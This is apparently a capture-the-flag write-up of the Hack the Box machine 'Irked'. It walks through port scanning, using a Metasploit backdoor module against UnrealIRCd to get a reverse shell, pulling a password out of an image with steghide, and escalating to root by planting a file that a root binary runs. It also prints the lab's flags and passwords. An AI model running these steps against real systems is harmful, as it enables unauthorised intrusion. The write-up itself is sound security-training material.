# Irked - Hack the Box

First things first.

## Nmap Scan

`nmap -p 1-65535 -T4 -A -v irked`

### Results
    PORT      STATE SERVICE VERSION
    22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
    | ssh-hostkey:
    |   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
    |   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
    |   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
    |_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
    80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
    | http-methods:
    |_  Supported Methods: POST OPTIONS GET HEAD
    |_http-server-header: Apache/2.4.10 (Debian)
    |_http-title: Site doesn't have a title (text/html).
    111/tcp   open  rpcbind 2-4 (RPC #100000)
    | rpcinfo:
    |   program version    port/proto  service
    |   100000  2,3,4        111/tcp   rpcbind
    |   100000  2,3,4        111/udp   rpcbind
    |   100000  3,4          111/tcp6  rpcbind
    |   100000  3,4          111/udp6  rpcbind
    |   100024  1          37348/udp6  status
    |   100024  1          54019/tcp6  status
    |   100024  1          56241/tcp   status
    |_  100024  1          59939/udp   status
    6697/tcp  open  irc     UnrealIRCd
    8067/tcp  open  irc     UnrealIRCd
    56241/tcp open  status  1 (RPC #100024)
    65534/tcp open  irc     UnrealIRCd


Let's run dirb on the website.

## Dirb Scan

`dirb http://irked`

### Results
    dirb http://irked

    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------

    START_TIME: Tue Mar 17 17:49:51 2020
    URL_BASE: http://irked/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

    -----------------

    GENERATED WORDS: 4612                                                          

    ---- Scanning URL: http://irked/ ----
    + http://irked/index.html (CODE:200|SIZE:72)                                                             
    ==> DIRECTORY: http://irked/manual/                                                                      
    + http://irked/server-status (CODE:403|SIZE:293)   


Nothing really to investigate here. The main page mentions a IRC being worked on.


## IRC Investigation

I googled how to connect to IRC channel. There was multiple programs to connect from the terminal. I used Irssi. So used `irssi -c irked -p 65534`. While connecting it showed the software and version:

    Your host is irked.htb, running version Unreal3.2.8.1

I tried to list all the info (users, channels, etc.) it seemed to be empty. We can still see if there are any CVEs for Unreal 3.2.8.1.


## CVE Investigation

**Apache** - No CVEs

**IRC Unreal 3.2.8.1** - `exploit/unix/irc/unreal_ircd_3281_backdoor UnrealIRCD 3.2.8.1 Backdoor Command Execution`

## Metasploit

I used the the exploit/unix/irc/unreal_ircd_3281_backdoor. I entered the hostname and port (irked / 65534).

I got a reverse shell. I was the user *ircd*.

### Enumeration Findings

- User: *djmardov*
- User: *ircd*
- OS: *Linux irked 3.16.0-6-686-pae #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) i686 GNU/Linux*

#### Note
*I used a python script to upgrade the TTY:*

`python -c 'import pty;pty.spawn("/bin/bash")'`

### Priv Esc

I found the user.txt file under djmardov's permissions. I need to esc my privs.

I send my session to the background with:

`background`.

I want to use meterpreter to upgrade my privs:

`use multi/manage/shell_to_meterpreter`

I saw that I had privs for .backup file

`ircd@irked:/home/djmardov/Documents$ ls -la`

    total 16
    drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
    drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..
    -rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
    -rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
    ircd@irked:/home/djmardov/Documents$ cat .backup
    cat .backup
    Super elite steg backup pw
    UPupDOWNdownLRlrBAbaSSss

I mentions steg so I used steghide on the emoji image on the website

`steghide extract -sf irked.jpeg`

That uncovered a password (presumably djmardov's). I switched to that user

`ircd@irked:/home/djmardov/Documents$ su djmardov
Password: Kab6h+m+bbp2J:HG`

Then I read that *user.txt* file

    4a66a78b12dc0e661a59d3f5c0267a8e

### Getting Root Access

Need Priv Esc so with some help I found the viewusers had a vuln where it made system calls from a file that did not exist.

The viewusers exec as root so we created a file that spawned a shell. This gave us a root shell.

    djmardov@irked:~$ cd /tmp
    djmardov@irked:/tmp$ vi listusers
    djmardov@irked:/tmp$ chmod +x listusers
    djmardov@irked:/tmp$ viewuser
    This application is being devleoped to set and test user permissions
    It is still being actively developed
    (unknown) :0           2020-03-17 17:47 (:0)
    djmardov pts/1        2020-03-19 16:19 (10.10.14.32)
    root@irked:/tmp# ls
    listusers                                                               systemd-private-4a996098bfb54342ac1fb0c28ab9c9ab-rtkit-daemon.service-W8JGaP
    systemd-private-4a996098bfb54342ac1fb0c28ab9c9ab-colord.service-0h2zYE  vmware-root
    systemd-private-4a996098bfb54342ac1fb0c28ab9c9ab-cups.service-Cg0OtI
    root@irked:/tmp# cd /root
    root@irked:/root# ls
    pass.txt  root.txt
    root@irked:/root# cat root.txt
    8d8e9e8be64654b6dccc3bff4522daf3
    root@irked:/root#
